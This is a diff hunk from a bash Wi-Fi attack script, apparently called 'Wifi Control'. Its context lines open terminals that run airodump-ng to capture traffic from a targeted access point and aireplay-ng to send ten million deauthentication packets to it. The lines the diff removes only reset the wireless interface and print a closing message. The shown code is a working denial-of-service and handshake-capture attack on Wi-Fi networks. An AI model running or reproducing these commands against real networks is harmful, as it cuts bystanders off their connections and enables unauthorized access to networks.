@@ -288,14 +288,6 @@ echo "========================================"; sleep 0.2
 sleep 0.5
 gnome-terminal -t "$NIC Sniping $ESSID" --geometry=100x20+0+320 -x airodump-ng $wlan --bssid $mac -c $ch -w $name 
  gnome-terminal -t "$NIC Sniping $ESSID" --geometry=100x20+0+320 -x aireplay-ng --deauth 10000000 -a $mac $wlan 
-ifconfig $wlan down
-airmon-ng check kill
-iwconfig $wlan mode managed
-ifconfig $wlan up
-service NetworkManager restart
-clear
-echo -e $yellow" Thanks For Using Wifi Control :)"
-exit
 fi
 
 
